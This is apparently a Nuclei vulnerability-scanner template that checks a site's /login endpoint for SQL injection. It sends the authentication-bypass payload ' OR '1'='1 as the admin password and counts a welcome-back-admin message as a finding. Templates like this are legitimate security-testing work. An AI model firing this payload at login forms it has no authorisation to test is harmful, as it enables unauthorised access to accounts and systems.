id: sql-injection-login-form
info:
  name: SQL Injection in Login Form
  author: pdteam
  severity: high

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    body: "username=admin&password=' OR '1'='1"
    headers:
      Content-Type: "application/x-www-form-urlencoded"

    matchers:
      - type: word
        words:
          - "<p>Welcome back, admin</p>"
        part: body
